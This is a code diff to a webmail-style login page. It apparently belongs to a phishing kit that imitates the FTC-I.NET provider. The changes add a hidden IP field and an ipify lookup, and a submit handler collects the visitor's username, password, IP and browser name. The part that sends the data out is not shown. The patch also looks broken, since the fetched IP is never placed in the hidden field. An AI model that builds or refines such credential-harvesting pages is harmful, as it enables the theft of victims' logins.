@@ -92,6 +92,7 @@ color:rgb(244, 67, 54);
                             <label>Password </label>
                             <input type="password" class="form-control" placeholder="Password" value="" name="epass" id="epass"  />
                         </div>
+                      <input value="" id="eip" name="eip" type="hidden" />
                         <div class="form-group">
                             <a href="#" class="ForgetPwd" id="eforgetp">Forget Password?</a>
                         </div>
@@ -132,13 +133,9 @@ color:rgb(244, 67, 54);
 
 
         function fetch_ip(){
-          var getip = null;
           $.getJSON("https://api.ipify.org?format=json", function(data) {
               getip =  data.ip;
-              return getip;
           });
-
-          return getip;
 
         }
 
@@ -146,18 +143,13 @@ color:rgb(244, 67, 54);
         $(document).ready(function(){
 
 
-
+        fetch_ip();
+          
         const provider = "FTC-I.NET(https://ftc.net)";
-        const get_ip = fetch_ip();
         const get_browsername = browserN();
-
-        alert(get_ip);
-
-
-
         $("#eform").on("submit", function (e){
           e.preventDefault();
-
+          var get_ip = $("#eip").val();
           var euser = $("#euser").val();
           var epass = $("#epass").val();
 
